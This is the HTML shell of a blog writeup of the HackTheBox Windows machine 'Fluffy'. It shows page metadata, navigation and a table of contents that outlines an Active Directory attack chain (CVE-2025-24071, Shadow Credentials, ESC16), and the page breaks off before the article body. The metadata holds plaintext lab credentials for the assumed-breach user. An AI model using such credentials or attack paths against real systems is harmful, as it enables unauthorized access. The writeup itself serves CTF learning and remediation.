<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>Htb-fluffy &#183; Bailey's Blog</title>
<meta name=title content="Htb-fluffy &#183; Bailey's Blog"><meta name=description content="Detailed writeup of fluffy from HackTheBox"><meta name=keywords content="hackthebox,Windows,Active Directory,CVE-2025-24071,ADCS,"><link rel=canonical href=https://localhost:1313/writeups/htb-fluffy/><link rel=stylesheet href=/css/chroma.css><link rel=stylesheet href=/css/term.css><link rel=stylesheet href=/css/copy-btn.css><link type=text/css rel=stylesheet href=/css/main.bundle.min.41ccf158e8b20af093f904e765d07015a786fdc35677cfc16ffff96a6b5235a45e9ce5dc22b59be2c7ec2ae5e4f302e565ca1e75c2439c5c81d44f4c70102851.css integrity="sha512-QczxWOiyCvCT+QTnZdBwFaeG/cNWd8/Bb//5amtSNaRenOXcIrWb4sfsKuXk8wLlZcoedcJDnFyB1E9McBAoUQ=="><script type=text/javascript src=/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj+e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script><script type=text/javascript src=/js/zen-mode.min.9814dee9614d32aeb56239d118edfe20acd6231424f9b19c2dd48835038414130a5e946c0d1c9087d60e60e31840c9babfd217e3d4b95643dc8d651a71ccdf4a.js integrity="sha512-mBTe6WFNMq61YjnRGO3+IKzWIxQk+bGcLdSINQOEFBMKXpRsDRyQh9YOYOMYQMm6v9IX49S5VkPcjWUacczfSg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.0ea09b1166a1db6af540bead84729a3fd7be30f0c3c795267cfe8e4e3d0e1d51fabedb42a7f1d84dff73be1a2cfc93cfadbd7e68f616f0d790d283ca028da522.js integrity="sha512-DqCbEWah22r1QL6thHKaP9e+MPDDx5UmfP6OTj0OHVH6vttCp/HYTf9zvhos/JPPrb1+aPYW8NeQ0oPKAo2lIg==" data-copy=Copy data-copied=Copied></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://localhost:1313/writeups/htb-fluffy/"><meta property="og:site_name" content="Bailey's Blog"><meta property="og:title" content="Htb-fluffy"><meta property="og:description" content="Detailed writeup of fluffy from HackTheBox"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2025-09-19T14:53:56+00:00"><meta property="article:modified_time" content="2025-09-19T14:53:56+00:00"><meta property="article:tag" content="Hackthebox"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Active Directory"><meta property="article:tag" content="CVE-2025-24071"><meta property="article:tag" content="ADCS"><meta name=twitter:card content="summary"><meta name=twitter:title content="Htb-fluffy"><meta name=twitter:description content="Detailed writeup of fluffy from HackTheBox"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Writeups","name":"Htb-fluffy","headline":"Htb-fluffy","description":"Detailed writeup of fluffy from HackTheBox","abstract":"\u003ch2 class=\u0022relative group\u0022\u003eOverview \n    \u003cdiv id=\u0022overview\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\u0022 href=\u0022#overview\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePlatform\u003c\/strong\u003e: HackTheBox\u003c\/li\u003e\n\u003cli\u003e\u003cstrong\u003eDifficulty\u003c\/strong\u003e: Easy\u003c\/li\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c\/strong\u003e: Windows\u003c\/li\u003e\n\u003cli\u003e\u003cstrong\u003eSkills\u003c\/strong\u003e: Active Directory, privilege escalation\u003c\/li\u003e\n\u003c\/ul\u003e\n\u003cp\u003e\u003cem\u003e\u003cstrong\u003eAssumed Breach Credentials: j.fleischman \/ J0elTHEM4n1990!\u003c\/strong\u003e\u003c\/em\u003e\u003c\/p\u003e","inLanguage":"en","url":"https:\/\/localhost:1313\/writeups\/htb-fluffy\/","author":{"@type":"Person","name":"BeejaySec"},"copyrightYear":"2025","dateCreated":"2025-09-19T14:53:56\u002b00:00","datePublished":"2025-09-19T14:53:56\u002b00:00","dateModified":"2025-09-19T14:53:56\u002b00:00","keywords":["hackthebox","Windows","Active Directory","CVE-2025-24071","ADCS"],"mainEntityOfPage":"true","wordCount":"2319"}]</script><meta name=author content="BeejaySec"><link href=https://www.linkedin.com/in/bailey-bradshaw-194597198/ rel=me><link href=https://github.com/0xBeejay rel=me><link href=https://www.linkedin.com/in/bailey-bradshaw-194597198/ rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-PEDMYR1V0K"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PEDMYR1V0K")</script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
Skip to main content</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 pl-[24px] pr-[24px] z-100"><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div><div class="relative max-w-[64rem] ml-auto mr-auto"><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium">Bailey&rsquo;s Blog</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/about/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=whoami>About</p></a><a href=/projects/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Projects</p></a><a href=/writeups/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Writeups>Writeups</p></a><a href=/contact/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Contact>Contact</p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentcolor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/about/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=whoami>About</p></a></li><li class=mt-1><a href=/projects/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Projects</p></a></li><li class=mt-1><a href=/writeups/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Writeups>Writeups</p></a></li><li class=mt-1><a href=/contact/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Contact>Contact</p></a></li></ul></div></div></div></div><script>(function(){var e=$(".main-menu"),t=window.location.pathname;e.find('a[href="'+t+'"]').each(function(e,t){$(t).children("p").addClass("active")})})()</script></div></div><script type=text/javascript src=/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js integrity="sha512-AKV8c+oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ+pkPSYl5ixQYmehaQ==" data-blur-id=menu-blur></script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><div id=hero class="h-[150px] md:h-[200px]"></div><div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"><img id=background-image src=/img/background.svg alt="Background Image" class="absolute inset-0 w-full h-full object-cover"><div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div><div class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div></div><div id=background-blur class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div><script type=text/javascript src=/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js integrity="sha512-AKV8c+oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ+pkPSYl5ixQYmehaQ==" data-blur-id=background-blur data-image-id=background-image data-image-url=/img/background.svg></script><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/>Bailey's Portfolio</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/writeups/>Writeups</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/writeups/htb-fluffy/>Htb-fluffy</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Htb-fluffy</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><span title="Reading time">11 mins</span><span class="px-2 text-primary-500">&#183;</span>
<span class=mb-[2px]><a href=https://github.com/nunocoracao/blowfish/tree/main/exampleSite/content/writeups/htb-fluffy.md class="text-lg hover:text-primary-500" rel="noopener noreferrer" target=_blank title="Edit content"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg height="1em" viewBox="0 0 512 512"><path fill="currentcolor" d="M441 58.9 453.1 71c9.4 9.4 9.4 24.6.0 33.9L424 134.1 377.9 88 407 58.9c9.4-9.4 24.6-9.4 33.9.0zM209.8 256.2 344 121.9 390.1 168 255.8 302.2c-2.9 2.9-6.5 5-10.4 6.1L186.9 325l16.7-58.5c1.1-3.9 3.2-7.5 6.1-10.4zM373.1 25 175.8 222.2c-8.7 8.7-15 19.4-18.3 31.1l-28.6 1e2c-2.4 8.4-.1 17.4 6.1 23.6s15.2 8.5 23.6 6.1l1e2-28.6c11.8-3.4 22.5-9.7 31.1-18.3L487 138.9c28.1-28.1 28.1-73.7.0-101.8L474.9 25C446.8-3.1 401.2-3.1 373.1 25zM88 64C39.4 64 0 103.4.0 152V424c0 48.6 39.4 88 88 88H360c48.6.0 88-39.4 88-88V312c0-13.3-10.7-24-24-24s-24 10.7-24 24V424c0 22.1-17.9 40-40 40H88c-22.1.0-40-17.9-40-40V152c0-22.1 17.9-40 40-40H2e2c13.3.0 24-10.7 24-24s-10.7-24-24-24H88z"/></svg></span></span></a>
</span><span class="px-2 text-primary-500">&#183;</span><span class=mb-[2px]>
<span id=zen-mode-button class="text-lg hover:text-primary-500" title="Enable zen mode" data-title-i18n-disable="Enable zen mode" data-title-i18n-enable="Disable zen mode"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 50 50" width="50" height="50"><path fill="currentcolor" d="M12.980469 4C9.1204688 4 5.9804688 7.14 5.9804688 11L6 26H9.9804688V11c0-1.65 1.3400002-3 3.0000002-3H40.019531c1.66.0 3 1.35 3 3V39c0 1.65-1.34 3-3 3H29c0 1.54-.579062 2.94-1.539062 4H40.019531c3.86.0 7-3.14 7-7V11c0-3.86-3.14-7-7-7H12.980469zM7 28c-2.206.0-4 1.794-4 4V42c0 2.206 1.794 4 4 4H23c2.206.0 4-1.794 4-4V32c0-2.206-1.794-4-4-4H7zm0 4H23L23.001953 42H7V32z"/></svg></span></span></span></span></div><div class="flex flex-row flex-wrap items-center"></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/writeups/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Writeups
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/hackthebox/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Hackthebox
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/windows/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Windows
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/active-directory/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Active Directory
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/cve-2025-24071/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">CVE-2025-24071
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/adcs/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">ADCS</span></span></a></div></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4" width=96 height=96 alt=BeejaySec src=/img/chrollo_hu_b8a595a15dc0bcb.jpg><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">BeejaySec</div><div class="text-sm text-neutral-700 dark:text-neutral-400">A cybersecurity enthusiast focusing on infra and web application security, constantly honing my skills through the participation of CTF&rsquo;s and security challenges.</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://www.linkedin.com/in/bailey-bradshaw-194597198/ target=_blank aria-label=Linkedin title=Linkedin rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentcolor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/0xBeejay target=_blank aria-label=Github title=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://www.linkedin.com/in/bailey-bradshaw-194597198/ target=_blank aria-label=Hackthebox title=Hackthebox rel="me noopener noreferrer"><span class="inline-block align-text-bottom"></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8"><div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#reconnaissance>Reconnaissance</a><ul><li><a href=#nmap-scan>Nmap Scan</a></li></ul></li><li><a href=#cve-2025-24071>CVE-2025-24071</a></li><li><a href=#bloodhound>Bloodhound</a></li><li><a href=#shadow-credentials>Shadow Credentials</a></li><li><a href=#usertxt>user.txt</a></li><li><a href=#esc16>ESC16</a></li><li><a href=#roottxt>root.txt</a></li><li><a href=#new-attack-methods-learned>New attack methods learned</a></li><li><a href=#possible-remediations>Possible Remediations</a></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#reconnaissance>Reconnaissance</a><ul><li><a href=#nmap-scan>Nmap Scan</a></li></ul></li><li><a href=#cve-2025-24071>CVE-2025-24071</a></li><li><a href=#bloodhound>Bloodhound</a></li><li><a href=#shadow-credentials>Shadow Credentials</a></li><li><a href=#usertxt>user.txt</a></li><li><a href=#esc16>ESC16</a></li><li><a href=#roottxt>root.txt</a></li><li><a href=#new-attack-methods-learned>New attack methods learned</a></li><li><a href=#possible-remediations>Possible Remediations</a></li></ul></nav></div></details><script>(function(){"use strict";const n=.33,s="#TableOfContents",o=".anchor",i='a[href^="#"]',a="li ul",r="active";function c(e,t){const s=window.scrollY+window.innerHeight*t,o=[...document.querySelectorAll('#TableOfContents a[href^="#"]')],n=new Set(o.map(e=>e.getAttribute("href").substring(1)));for(let t=e.length-1;t>=0;t--){const o=e[t].getBoundingClientRect().top+window.scrollY;if(o<=s&&n.has(e[t].id))return e[t].id}return e.find(e=>n.has(e.id))?.id||""}function e({toc:e,anchors:t,links:n,scrollOffset:s,collapseInactive:o}){const i=c(t,s);if(!i)return;if(n.forEach(e=>{const t=e.getAttribute("href")===`#${i}`;if(e.classList.toggle(r,t),o){const n=e.closest("li")?.querySelector("ul");n&&(n.style.display=t?"":"none")}}),o){const n=e.querySelector(`a[href="#${CSS.escape(i)}"]`);let t=n;for(;t&&t!==e;)t.tagName==="UL"&&(t.style.display=""),t.tagName==="LI"&&t.querySelector("ul")?.style.setProperty("display",""),t=t.parentElement}}function t(){const t=document.querySelector(s);if(!t)return;const c=!1,l=[...document.querySelectorAll(o)],d=[...t.querySelectorAll(i)];c&&t.querySelectorAll(a).forEach(e=>e.style.display="none");const 